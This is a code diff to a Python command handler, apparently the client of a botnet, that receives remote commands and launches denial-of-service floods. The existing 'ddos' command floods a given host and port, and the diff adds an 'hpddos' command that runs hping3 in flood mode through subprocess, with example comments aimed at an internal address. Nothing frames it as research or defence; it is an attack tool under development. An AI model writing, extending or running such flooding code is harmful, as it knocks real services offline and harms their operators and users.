@@ -1,5 +1,6 @@
 import os
 import socket
+import subprocess
 
 
 from .. import BaseResponder
@@ -24,11 +25,16 @@ class Toast(BaseResponder):
 			print('>>> COMMAND RECEIVED: %s' % command)
 			cmd, *params = command.split()
 
+			# !ddos 192.168.1.66:80
 			if cmd == 'ddos' and params:
 				self.respond(msg, command + ' ok')
 				print(params)
 				host, port = params[0].split(':')
 				self.dudos(sock=msg, host=host, port=int(port))
+			# !hpddos 192.168.1.66
+			elif cmd == 'hpddos' and params:
+				host, port = params[0].split(':')
+				subprocess.check_output(['hping3', host, '--flood']) #sudo?
 			elif cmd == 'quit':
 				self.respond(msg, command + ' ok')
 				self.respond(msg, 'Bye!')
